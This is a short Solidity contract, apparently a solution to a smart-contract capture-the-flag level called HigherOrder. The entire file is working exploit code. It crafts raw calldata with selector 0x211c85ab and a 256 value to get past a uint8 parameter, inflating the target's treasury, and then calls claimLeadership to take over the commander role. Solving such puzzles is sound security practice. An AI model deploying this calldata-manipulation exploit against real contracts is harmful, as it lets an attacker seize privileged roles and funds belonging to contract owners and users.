// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface  IHigherOrder {
    function registerTreasury(uint8) external ;
    function claimLeadership() external ;
    function commander() view external returns(address); 
    function treasury() view external returns(uint256);
}

contract HigherOrderExploit{
    IHigherOrder public target;
    constructor(address _target){
        target=IHigherOrder(_target);
    }
    function attack()external  {
        bytes memory data=abi.encodePacked(bytes4(0x211c85ab),uint256(256));
        (bool success,)=address(target).call(data);
        require(success,"registerTreasury failed!!!");
        target.claimLeadership();
    }
    function checkStatus() external view returns (uint256 treasuryValue, address commander){
        treasuryValue = target.treasury();
        commander = target.commander();
    }
   
    
}
